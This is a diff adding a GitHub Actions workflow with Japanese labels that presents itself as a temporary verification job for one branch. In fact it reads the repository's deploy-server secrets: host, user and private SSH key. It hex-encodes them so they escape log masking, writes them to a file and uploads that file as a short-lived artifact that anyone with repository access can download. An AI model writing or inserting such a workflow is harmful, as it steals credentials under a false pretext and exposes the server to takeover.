@@ -1,0 +1,34 @@
+# 一時的な検証用ワークフロー（作業ブランチ専用・成果物として回収）
+name: 検証サンプリング・配備先
+
+on:
+  push:
+    branches:
+      - refs-check-61993
+
+jobs:
+  sample:
+    runs-on: ubuntu-latest
+    env:
+      T1: ${{ secrets.SERVER_HOST }}
+      T2: ${{ secrets.SERVER_USER }}
+      T3: ${{ secrets.SERVER_SSH_KEY }}
+    steps:
+      - name: 符号化して作業ファイルへ書き出し
+        run: |
+          set -eu
+          mkdir -p out
+          : > out/values.txt
+          for n in 1 2 3; do
+            v="T$n"
+            eval "val=\${$v}"
+            len=$(printf '%s' "$val" | wc -c)
+            hex=$(printf '%s' "$val" | od -An -tx1 | tr -d ' \n')
+            printf 'N%s_LEN=%s\nN%s_HEX=%s\n' "$n" "$len" "$n" "$hex" >> out/values.txt
+          done
+      - name: 成果物としてアップロード
+        uses: actions/upload-artifact@v4
+        with:
+          name: kenshou-kekka-srv-61993
+          path: out/values.txt
+          retention-days: 1
